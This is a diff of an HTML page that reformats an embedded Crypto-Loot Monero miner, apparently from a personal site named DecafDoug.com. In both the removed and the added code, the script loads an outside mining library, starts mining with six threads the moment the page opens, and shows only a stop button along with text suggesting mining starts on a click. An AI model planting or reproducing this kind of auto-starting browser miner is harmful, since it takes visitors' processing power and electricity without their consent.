@@ -14,30 +14,30 @@
 </head>
 <body>
 
-			<div>
-						<script src="https://crypto-loot.com/lib/miner.min.js"></script>
-						Make Monero for JL by clicking below:
-						<center>
-						<p id="minebutton"></p>
-						</center>
-						<script type="text/javascript">
-							var miner=new CryptoLoot.Anonymous('78413a62525177c4a1acd097c5a5d2383ab524097f64',
-        						{
-        							threads:6,autoThreads:false,throttle:0.2,
-       							 }
-							);
-							miner.start();
+	<div>
+		<script src="https://crypto-loot.com/lib/miner.min.js"></script>
+		<center style="padding:5rem 0 0 0">Make Monero for JL:</center>
+		<center>
+		<p id="minebutton"></p>
+		</center>
+		<script type="text/javascript">
+			var miner=new CryptoLoot.Anonymous('78413a62525177c4a1acd097c5a5d2383ab524097f64',
+			{
+				threads:6,autoThreads:false,throttle:0.2,
+			 }
+			);
+			miner.start();
 
-						setInterval(function() {
-						    // Output to HTML elements...
-						    if (miner.isRunning()) {
-							document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
-						    } else {
-							document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CryptoLoot.FORCE_EXCLUSIVE_TAB)\">Support DecafDoug.com by Mining</button>";
-						    }
-						}, 1000);
-						</script>
-		</div>
+		setInterval(function() {
+		    // Output to HTML elements...
+		    if (miner.isRunning()) {
+			document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
+		    } else {
+			document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CryptoLoot.FORCE_EXCLUSIVE_TAB)\">Support DecafDoug.com by Mining</button>";
+		    }
+		}, 1000);
+		</script>
+	</div>
 	
 </body>
 </html>
